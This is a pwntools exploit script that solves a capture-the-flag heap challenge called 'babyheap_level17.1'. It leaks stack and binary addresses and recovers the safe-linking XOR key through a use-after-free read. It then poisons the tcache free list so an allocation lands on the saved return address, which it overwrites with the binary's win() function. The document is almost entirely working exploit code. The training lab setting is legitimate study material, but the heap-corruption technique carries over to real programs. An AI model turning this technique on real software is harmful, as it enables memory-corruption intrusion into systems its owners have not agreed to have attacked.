# idea: overwrite allocations[0] to be SIP, instead of malloc a chunk to SIP.

from pwn import *
BINARY = "/challenge/babyheap_level17.1"
p = process(BINARY)
#p = gdb.debug("/challenge/babyheap_level17.0")
binary = ELF(BINARY)

def overwrite_alloc(alloc:bytes, loc:bytes, win:bytes):
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'80')
    p.sendline(b'free')
    p.sendline(b'1')
    p.sendline(b'free')
    p.sendline(b'2')

    # allocations[1] = allocations[0]
    p.sendline(b'scanf')
    p.sendline(b'2')
    p.recv()
    p.sendline(alloc)
    p.sendline(b'malloc')
    p.sendline(b'2')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')

    # allocations[0] = SIP
    p.sendline(b'scanf')
    p.sendline(b'1')
    p.recv()
    p.sendline(loc)

    # *SIP = win()
    p.sendline(b'scanf')
    p.sendline(b'0')
    p.recv()
    p.sendline(win)


def get_xor_bytes()->bytes:
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'80')
    p.sendline(b'malloc')
    p.sendline(b'1')
    p.sendline(b'80')
    p.sendline(b'free')
    p.sendline(b'0')

    p.sendline(b'puts')
    p.sendline(b'0')
    p.recvuntil(b'Data: ')
    xor_bytes = p.recvuntil(b'\n')[:-1]
    # cleanup
    p.sendline(b'malloc')
    p.sendline(b'0')
    p.sendline(b'80')

    return xor_bytes

p.recvuntil(b'LEAK')
p.recvuntil(b'at: ')
stack_leak = int(p.recvuntil(b'.')[:-1], 16)
ret_addr = stack_leak + 0x158
print(f'ret_addr = {hex(ret_addr)}')

p.recvuntil(b'LEAK')
p.recvuntil(b'at: ')
main_leak = p.recvuntil(b'.')[:-1]
binary_base = int(main_leak, 16) - binary.sym.main
binary.address = binary_base
print(f'win() = {hex(binary.sym.win)}')

xor_bytes = unpack(get_xor_bytes(), 'all')
print(f'xor_bytes = {hex(xor_bytes)}')

overwrite_alloc(p64(stack_leak ^ xor_bytes), p64(ret_addr), p64(binary.sym.win))
p.sendline(b'quit')

p.interactive()